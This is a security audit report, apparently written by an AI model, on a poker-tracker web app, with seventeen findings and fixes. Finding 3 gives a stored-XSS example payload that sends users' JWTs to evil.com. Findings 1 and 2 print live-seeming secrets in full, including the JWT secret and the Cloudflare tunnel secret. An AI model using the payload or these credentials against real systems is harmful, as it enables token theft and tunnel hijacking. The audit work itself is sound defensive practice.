# Security Assessment — poker-tracker-app

**Date:** 2026-06-20  
**Assessed by:** Claude (automated static analysis)  
**Scope:** Full source review of `server/index.js`, `server/db.js`, `src/App.js`, `.env`, `cloudflared/credentials.json`, `docker-compose.yml`, `Dockerfile`, `package.json`  
**Repository:** https://github.com/clance1/poker-tracker-app

---

## Executive Summary

The poker-tracker-app has **three critical vulnerabilities** requiring immediate action before the next deployment:

1. **Live API secrets are sitting in `.env` on disk** — an Anthropic API key, Telegram bot token, and Cloudflare tunnel secret are all present in plaintext files. While `.env` and `credentials.json` are correctly gitignored, they exist on the host filesystem and would be exposed if Docker build context, logs, or any file-read path leaked them.

2. **Stored XSS via `dangerouslySetInnerHTML`** — achievement `imageSvg` content is fetched from the database and injected directly into the DOM without sanitization. Any admin (or a compromised admin account) can write a malicious SVG payload that executes JavaScript for every user who views the achievements page, stealing JWT tokens and session data.

3. **No rate limiting on authentication endpoints** — `/api/login` and `/api/register` accept unlimited requests, making brute-force and credential-stuffing attacks trivial against the public `www.carsonsgame.com` tunnel.

Beyond these, there are high-severity gaps in authorization (any logged-in user can tamper with game buy-ins), a weak JWT secret, a default `admin`/`admin` password with no forced rotation, and two critical CVEs in dependencies.

---

## Findings Table

| # | Severity | Category | Location | Title |
|---|----------|----------|----------|-------|
| 1 | 🔴 Critical | Secrets Exposure | `.env` lines 1–8 | Live API keys in `.env` file |
| 2 | 🔴 Critical | Secrets Exposure | `cloudflared/credentials.json` | Cloudflare tunnel secret on disk |
| 3 | 🔴 Critical | XSS | `src/App.js:2373` | Stored XSS via `dangerouslySetInnerHTML` on `imageSvg` |
| 4 | 🟠 High | Authentication | `server/index.js:172–210` | No rate limiting on login / register |
| 5 | 🟠 High | Authentication | `server/index.js:25–27, 126` | Weak JWT secret + default `admin`/`admin` password |
| 6 | 🟠 High | Authorization | `server/index.js:534–573` | Any authenticated user can add/modify game-player records |
| 7 | 🟠 High | CORS | `server/index.js:48` | Wildcard CORS — all origins accepted |
| 8 | 🟠 High | Authentication | `src/App.js:11–21` | JWT stored in `localStorage` (XSS-stealable) |
| 9 | 🟠 High | Dependencies | `package.json` | 2 Critical CVEs + 20+ High CVEs in dependencies |
| 10 | 🟡 Medium | Authorization | `server/index.js:189, 208` | JWT tokens non-revocable (30-day lifetime, no blacklist) |
| 11 | 🟡 Medium | Input Validation | `server/index.js:536` | No upper-bound validation on financial amounts |
| 12 | 🟡 Medium | Data Integrity | `server/db.js:9` | SQLite foreign keys disabled |
| 13 | 🟡 Medium | Security Headers | `server/index.js` | No Content-Security-Policy or other security headers |
| 14 | 🟡 Medium | Data Exposure | `server/index.js:786–788` | API error messages may leak internal detail |
| 15 | 🔵 Low | Secrets | `server/index.js:63–119` | Telegram leaks player names + financials to external API |
| 16 | 🔵 Low | Supply Chain | `cloudflared.exe` | Unverified binary committed to repo |
| 17 | ℹ️ Info | Auth | `server/index.js:189` | Password minimum length is only 6 characters |

---

## Detailed Findings

---

### Finding 1 — 🔴 Critical: Live API Keys in `.env`

**File:** `.env`, lines 1–8  
**Description:** The `.env` file on disk contains production secrets in plaintext:

```
JWT_SECRET=te7eW6urU8BzGgy9*tnw
ANTHROPIC_API_KEY="sk-ant-api03-8msTyF30Y8zM..."   ← live Anthropic key
TELEGRAM_BOT_TOKEN="8923758926:AAFaT1dT5tre4jMhw..."  ← live Telegram token
TELEGRAM_CHAT_ID="8555711488"
```

The file is correctly listed in `.gitignore` and is not in git history. However:
- Docker's `COPY . .` in the `Dockerfile` copies `.env` into the image layer at build time unless a `.dockerignore` excludes it. The `.dockerignore` present in the project should be checked to confirm `.env` is excluded.
- If the image is pushed to any registry, secrets inside any layer are extractable with `docker save`.
- Any accidental `git add -f .env` or a CI/CD misconfiguration would immediately publish the keys.

The Anthropic API key can be used to run expensive LLM calls billed to your account. The Telegram bot token gives full control of the bot, including reading all chat messages it can access.

**Recommendation:**

1. **Immediately rotate all three secrets** (Anthropic key, Telegram token, JWT secret) — do this now regardless of whether they have been exposed.
2. Verify `.dockerignore` explicitly excludes `.env`:
   ```
   # .dockerignore
   .env
   cloudflared/credentials.json
   ```
3. In production, inject secrets via the container orchestrator's secret management (Docker secrets, environment variables from a secrets manager) rather than a `.env` file on disk.
4. Replace the JWT secret with a cryptographically random 256-bit value:
   ```bash
   node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
   ```

---

### Finding 2 — 🔴 Critical: Cloudflare Tunnel Secret on Disk

**File:** `cloudflared/credentials.json`  
**Content:**
```json
{
  "AccountTag": "55ef62a4e6f4521711993d26cb5360e0",
  "TunnelSecret": "l4z8tVSDOuX5LlGPoqC8Lm1tY+Bl71UieP2faJK8EOc=",
  "TunnelID": "6879de23-ceae-439b-a19d-2b8342e45501"
}
```

The `TunnelSecret` authenticates the cloudflared daemon to Cloudflare's network. Anyone with this value can run a process that impersonates your tunnel, potentially hijacking all traffic destined for `www.carsonsgame.com`.

The file is gitignored and not in git history, but it is mounted directly into the `cloudflared` Docker container as a read-only volume. If the container is compromised or the host filesystem is readable, the secret is exposed.

**Recommendation:**

1. **Rotate the tunnel credentials immediately** via the Cloudflare Zero Trust dashboard: delete tunnel `6879de23-ceae-439b-a19d-2b8342e45501` and create a new one.
2. Store the new credentials using Docker secrets or an environment variable rather than a file on disk:
   ```bash
   # Use cloudflared's TUNNEL_TOKEN env var instead of credentials.json
   cloudflared tunnel run --token <TOKEN>
   ```
3. Update `docker-compose.yml` to pass `TUNNEL_TOKEN` as an environment variable instead of volume-mounting the credentials file.

---

### Finding 3 — 🔴 Critical: Stored XSS via `dangerouslySetInnerHTML` on Achievement SVG

**File:** `src/App.js`, line 2373  
**Also affected:** `server/index.js`, lines 1193–1194 (no sanitization before DB write)

```jsx
// src/App.js:2373 — VULNERABLE
function AchievementImage({ src, imageFrame, className = "" }) {
  const isSvg = src.trimStart().startsWith('<svg') || src.trimStart().startsWith('<SVG');
  if (isSvg) {
    return <div className={"joker-svg-art " + className} dangerouslySetInnerHTML={{ __html: src }} />;
    //                                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //                                                     Raw DB content injected into the DOM
  }
```

```js
// server/index.js:1193 — No sanitization of SVG stored to DB
if (req.body.imageSvg !== undefined) {
  sets.push('imageSvg = ?'); vals.push(req.body.imageSvg || null);  // ← stored as-is
}
```

**Attack scenario:** An admin with a compromised account (or a legitimate but malicious admin) calls `PATCH /api/achievements/:id` with a payload like:
```json
{ "imageSvg": "<svg><script>fetch('https://evil.com/?t=' + localStorage.getItem('poker_token'))</script></svg>" }
```

Every user who views the achievements page will have their JWT silently exfiltrated. Because the JWT grants API access for 30 days with no revocation mechanism, the attacker retains access even after the victim logs out.

**Recommendation:**

Server-side, sanitize SVG content before storing it using DOMPurify (in Node.js via `isomorphic-dompurify` or `jsdom` + `dompurify`):

```js
// server/index.js — sanitize imageSvg before DB write
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// In the PATCH /api/achievements/:id handler:
if (req.body.imageSvg !== undefined) {
  const clean = req.body.imageSvg
    ? DOMPurify.sanitize(req.body.imageSvg, { USE_PROFILES: { svg: true } })
    : null;
  sets.push('imageSvg = ?'); vals.push(clean);
}
```

As a defense-in-depth measure, also add a Content-Security-Policy header that blocks inline scripts (see Finding 13).

---

### Finding 4 — 🟠 High: No Rate Limiting on Login / Register

**File:** `server/index.js`, lines 172–210  
**Description:** `/api/login` and `/api/register` perform no rate limiting. An attacker can make thousands of requests per second against `www.carsonsgame.com`:

```js
// server/index.js:199 — no rate limit check before bcrypt compare
app.post('/api/login', async (req, res) => {
  const username = sanitizeStr(req.body.username, 30);
  const { password } = req.body;
  ...
  const match = await bcrypt.compare(password, user.password_hash);  // expensive, but unlimited attempts
```

**Recommendation:** Install `express-rate-limit` and add a strict limiter to auth endpoints:

```bash
npm install express-rate-limit
```

```js
// server/index.js — add near top, after middleware setup
const rateLimit = require('express-rate-limit');

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 20,                    // 20 attempts per IP per window
  message: { error: 'Too many attempts. Please try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/api/login', authLimiter, async (req, res) => { ... });
app.post('/api/register', authLimiter, async (req, res) => { ... });
```

---

### Finding 5 — 🟠 High: Weak JWT Secret + Default `admin`/`admin` Password

**File:** `server/index.js`, lines 25, 126  

```js
// Line 25 — fallback weak secret
const JWT_SECRET = process.env.JWT_SECRET || 'change-this-secret';

// Line 126 — default admin password is 'admin'
const hash = bcrypt.hashSync('admin', BCRYPT_ROUNDS);
db.prepare('INSERT INTO users ...').run(adminId, 'admin', hash, ...);
console.log('Admin account created — login with admin / admin and change the password.');
```

The JWT secret in `.env` (`te7eW6urU8BzGgy9*tnw`) is only 20 characters and not randomly generated. If it is brute-forced or exposed (see Finding 1), all tokens can be forged indefinitely.

The default `admin`/`admin` password is logged to the console and has no enforcement of rotation. Any new deployment (or test environment) where the password is not immediately changed is vulnerable.

**Recommendation:**

Replace the JWT secret with a 64-character hex string (see Finding 1 recommendation). For the admin password, generate a random one-time password on first boot and print it once, requiring a change on first login:

```js
function seedAdmin() {
  const existing = db.prepare('SELECT id FROM users WHERE username = ? COLLATE NOCASE').get('admin');
  if (!existing) {
    // Generate a random one-time password instead of 'admin'
    const otp = require('crypto').randomBytes(8).toString('hex');
    const hash = bcrypt.hashSync(otp, BCRYPT_ROUNDS);
    ...
    console.log(`\n⚠️  Admin account created. One-time password: ${otp}\nChange it immediately after first login.\n`);
  }
}
```

Optionally, add a `mustChangePassword` flag to the `users` table and block all non-password-change API calls until it is cleared.

---

### Finding 6 — 🟠 High: Any Authenticated User Can Modify Game-Player Records

**File:** `server/index.js`, lines 534–573  

```js
// Line 534 — only requires 'auth', not 'ownerAuth'
app.post('/api/game-players', auth, (req, res) => { ... });

// Line 551 — any user can change anyone's buy-in, rebuys, and cash-out
app.put('/api/game-players/:id', auth, (req, res) => {
  const gp = db.prepare('SELECT * FROM game_players WHERE id = ?').get(req.params.id);
  // No check that req.user owns this record or the game
  ...
  db.prepare('UPDATE game_players SET buyIn = ?, rebuys = ?, cashOut = ? WHERE id = ?')
    .run(buyIn, rebuys, cashOut, req.params.id);
```

A regular user can set their own `cashOut` to any value, or modify another player's financial records. This is a significant business logic flaw given the app tracks real money.

**Recommendation:** For `POST /api/game-players`, keep `auth` but verify the game is not complete. For `PUT /api/game-players/:id`, restrict modification to the game owner or admin:

```js
app.put('/api/game-players/:id', auth, (req, res) => {
  const gp = db.prepare('SELECT gp.*, g.ownerId FROM game_players gp JOIN games g ON gp.gameID = g.id WHERE gp.id = ?').get(req.params.id);
  if (!gp) return res.status(404).json({ error: 'Not found' });

  // Only the game owner, an admin, or the linked player can update
  const isOwner = req.user.userId === gp.ownerId;
  const isAdmin = req.user.role === 'admin';
  if (!isOwner && !isAdmin) {
    return res.status(403).json({ error: 'Only the game owner or an admin can update player records.' });
  }
  ...
});
```

---

### Finding 7 — 🟠 High: Wildcard CORS

**File:** `server/index.js`, line 48  

```js
app.use(cors());  // Accepts requests from any origin
```

With no origin restriction, any website can make authenticated cross-origin requests on behalf of users who are logged into the app. While JWT bearer tokens (unlike cookies) are not automatically sent with cross-origin requests, this creates risk if auth ever shifts to cookies, and it sets an unnecessarily permissive posture for an app with a fixed known domain.

**Recommendation:**

```js
app.use(cors({
  origin: process.env.ALLOWED_ORIGIN || 'https://www.carsonsgame.com',
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

Add `ALLOWED_ORIGIN=https://www.carsonsgame.com` to `.env` (and `http://localhost:3000` for local dev via `ALLOWED_ORIGIN_DEV`).

---

### Finding 8 — 🟠 High: JWT Stored in `localStorage`

**File:** `src/App.js`, lines 11–21  

```js
const getToken = () => localStorage.getItem("poker_token");
const setToken = (t) => localStorage.setItem("poker_token", t);
const getRole = () => localStorage.getItem("poker_role") || "user";
const storeRole = (r) => localStorage.setItem("poker_role", r);
```

`localStorage` is accessible to any JavaScript running on the page. If XSS is achieved (see Finding 3), the JWT token, username, and role can all be exfiltrated silently. Because tokens are valid for 30 days with no revocation, a stolen token gives persistent access.

**Recommendation:** Store the JWT in an `HttpOnly` cookie instead of `localStorage`. `HttpOnly` cookies are not accessible to JavaScript and cannot be stolen via XSS:

```js
// server/index.js — on login, set cookie instead of returning token in body
res.cookie('auth_token', token, {
  httpOnly: true,
  secure: true,          // HTTPS only
  sameSite: 'strict',
  maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 days in ms
});
res.json({ username: user.username, role });
```

```js
// Auth middleware — read from cookie
function auth(req, res, next) {
  const token = req.cookies?.auth_token;
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  ...
}
```

This requires adding `cookie-parser` (`npm install cookie-parser`) and updating the client to remove the `Authorization: Bearer` header.

---

### Finding 9 — 🟠 High: Dependency Vulnerabilities

**Source:** `npm audit` output  

Two **Critical** CVEs affect runtime dependencies:

| Package | CVE | Description |
|---------|-----|-------------|
| `form-data` | GHSA-fjxv-7rqg-78g4 | Uses `Math.random()` for boundary — predictable, allows boundary collision |
| `form-data` | GHSA-hmw2-7cc7-3qxx | CRLF injection via unescaped field names/filenames |
| `shell-quote` | GHSA-w7jw-789q-3m8p | Newlines in `.op` values not escaped — command injection |

High CVEs with direct runtime impact include `jsonpath` (arbitrary code injection), `ws` (DoS via header exhaustion), and `webpack-dev-middleware` (path traversal).

Most react-scripts HIGH CVEs are in the build toolchain and do not affect the production runtime.

**Recommendation:**

```bash
npm audit fix
# For breaking changes, review individually:
npm audit fix --force
```

For `react-scripts` (pinned to 5.0.1, no auto-fix available), consider migrating the frontend to Vite:
```bash
npm create vite@latest -- --template react
```

Vite has far fewer transitive vulnerabilities and better performance.

---

### Finding 10 — 🟡 Medium: Non-Revocable JWT Tokens (30-Day Lifetime)

**File:** `server/index.js`, lines 189, 208  

```js
const token = jwt.sign({ userId: id, username, role: 'user' }, JWT_SECRET, { expiresIn: '30d' });
```

When a user changes their password, logs out from one device, or is deleted, existing tokens remain valid for up to 30 days. There is no token revocation mechanism (no blacklist, no version counter in the token).

**Recommendation:** Add a `tokenVersion` integer to the `users` table. Include it in the JWT payload and validate it on each request:

```js
// In DB: ALTER TABLE users ADD COLUMN tokenVersion INTEGER NOT NULL DEFAULT 0;

// On login:
const token = jwt.sign({ userId, username, role, tv: user.tokenVersion }, JWT_SECRET, { expiresIn: '30d' });

// In auth middleware:
const user = db.prepare('SELECT tokenVersion FROM users WHERE id = ?').get(req.user.userId);
if (!user || user.tokenVersion !== req.user.tv) return res.status(401).json({ error: 'Token revoked' });

// On password change or logout: db.prepare('UPDATE users SET tokenVersion = tokenVersion + 1 WHERE id = ?').run(userId);
```

---

### Finding 11 — 🟡 Medium: No Upper-Bound Validation on Financial Amounts

**File:** `server/index.js`, lines 536–538  

```js
const buyIn = parseFloat(req.body.buyIn);
if (isNaN(buyIn) || buyIn <= 0) return res.status(400).json({ error: 'Buy-in must be greater than $0.' });
```

There is no maximum value check. A user could submit a buy-in of `999999999`, corrupting game totals, statistics, and achievement logic.

**Recommendation:**

```js
const MAX_BUYIN = 10000;  // set to a realistic ceiling for your game
const buyIn = parseFloat(req.body.buyIn);
if (isNaN(buyIn) || buyIn <= 0) return res.status(400).json({ error: 'Buy-in must be greater than $0.' });
if (buyIn > MAX_BUYIN) return res.status(400).json({ error: `Buy-in cannot exceed $${MAX_BUYIN}.` });
```

Apply the same check to `rebuys` and `cashOut` in `PUT /api/game-players/:id`.

---

### Finding 12 — 🟡 Medium: SQLite Foreign Keys Disabled

**File:** `server/db.js`, line 9  

```js
db.pragma('foreign_keys = OFF');
```

With foreign key enforcement disabled, deleting a player does not cascade to `game_players`, deleting a game does not cascade to `game_players`, and so on. The application code manually handles some of these (`DELETE FROM game_players WHERE playerID = ?` after deleting a player), but the lack of DB-level enforcement means a code path that misses a cleanup step will silently produce orphaned records and incorrect statistics.

**Recommendation:** Remove this pragma (or change it to `ON`) and add proper `ON DELETE CASCADE` constraints to the schema:

```sql
-- In db.js schema:
CREATE TABLE IF NOT EXISTS game_players (
  id TEXT PRIMARY KEY,
  gameID TEXT NOT NULL REFERENCES games(id) ON DELETE CASCADE,
  playerID TEXT NOT NULL REFERENCES players(id) ON DELETE CASCADE,
  ...
);
```

Then enable enforcement:
```js
db.pragma('foreign_keys = ON');
```

---

### Finding 13 — 🟡 Medium: No Security Headers

**File:** `server/index.js`  

The server sends no `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, or `X-Content-Type-Options` headers. This makes XSS more impactful and enables clickjacking.

**Recommendation:** Install `helmet` and add it as early middleware:

```bash
npm install helmet
```

```js
// server/index.js — before all routes
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],         // no 'unsafe-inline' — blocks injected scripts
      styleSrc: ["'self'", "'unsafe-inline'"],  // inline styles common in React
      imgSrc: ["'self'", "data:", "blob:"],
      connectSrc: ["'self'"],
    },
  },
}));
```

Note: Adding a strict CSP will also mitigate Finding 3 as a defense-in-depth layer.

---

### Finding 14 — 🟡 Medium: API Error Messages May Leak Internal Detail

**File:** `server/index.js`, lines 786–788  

```js
} catch (err) {
  console.error('Claude API error:', err);
  res.write(`data: ${JSON.stringify({ error: err.message || 'Claude API error' })}\n\n`);
}
```

The raw `err.message` from the Anthropic SDK (and similar patterns in other catch blocks) is returned to the client. SDK errors may include model names, quota limits, internal API paths, or other details useful to an attacker enumerating the system.

**Recommendation:** Return generic messages to clients and log detailed errors server-side only:

```js
} catch (err) {
  console.error('Claude API error:', err);  // full detail server-side
  res.write(`data: ${JSON.stringify({ error: 'AI service temporarily unavailable.' })}\n\n`);
}
```

---

### Finding 15 — 🔵 Low: Telegram Integration Leaks Player Financials Externally

**File:** `server/index.js`, lines 63–119  

The `telegramNotify` function sends player names, buy-in amounts, cash-out amounts, and achievement data to Telegram's servers:

```js
telegramNotify(`💵 <b>${player.name}</b> bought in for $${buyIn.toFixed(0)} — ${game.date}`);
telegramNotify(`💰 <b>${row.name}</b> cashed out $${parseFloat(req.body.cashOut).toFixed(0)}`);
telegramNotify(`🏆 <b>${displayName}</b> just earned the "<b>${ach.name}</b>" achievement!`);
```

This sends real financial data to a third-party service. If Telegram's API is ever compromised, or if the bot token is stolen (see Finding 1), all game history is exposed.

**Recommendation:** Ensure all users consent to this data sharing. Consider making Telegram notifications optional (a config flag), and avoid including exact financial amounts in notifications if privacy is a concern. Minimum: rotate the bot token (see Finding 1) and restrict the bot to only the intended chat via Telegram's chat ID validation (already done — `TELEGRAM_CHAT_ID` is set).

---

### Finding 16 — 🔵 Low: Unverified Binary in Repository

**File:** `cloudflared.exe` (repo root)  

A Windows binary is committed to the repository. There is no checksum or signature verification in the repo. If the repository is cloned from a compromised source or if the binary is replaced via a supply-chain attack, it would silently run malicious code on the host.

**Recommendation:** Remove `cloudflared.exe` from the repository. Add it to `.gitignore`. Instead, reference `cloudflare/cloudflared` via the Docker image (already used in `docker-compose.yml`) or download it with a pinned version and verified SHA-256 in your deployment scripts:

```bash
# Example deployment script
CLOUDFLARED_VERSION="2024.11.0"
EXPECTED_SHA="<sha256 from official release>"
curl -L "https://github.com/cloudflare/cloudflared/releases/download/${CLOUDFLARED_VERSION}/cloudflared-linux-amd64" -o cloudflared
echo "${EXPECTED_SHA}  cloudflared" | sha256sum -c
```

---

### Finding 17 — ℹ️ Info: Password Minimum Length is 6 Characters

**File:** `server/index.js`, lines 179, 246  

The minimum password length of 6 characters is below NIST SP 800-63B recommendations (8 characters minimum, 15+ encouraged for privileged accounts).

**Recommendation:** Raise to at least 8 characters:

```js
if (!password || password.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters.' });
```

---

## Immediate Action Checklist

The following should be done **right now**, before the next code push or deployment:

- [ ] **Rotate Anthropic API key** at console.anthropic.com → delete current key, generate new one
- [ ] **Rotate Telegram bot token** via `@BotFather` → `/revoke`
- [ ] **Rotate Cloudflare tunnel** — delete tunnel `6879de23-...` in the Zero Trust dashboard, create new, update `credentials.json`
- [ ] **Generate a new JWT secret**: `node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"`
- [ ] **Check `.dockerignore`** — confirm `.env` and `cloudflared/credentials.json` are excluded from Docker build context
- [ ] **Change the admin password** if this instance has never had it changed

After rotating secrets, work through the numbered findings above in severity order.
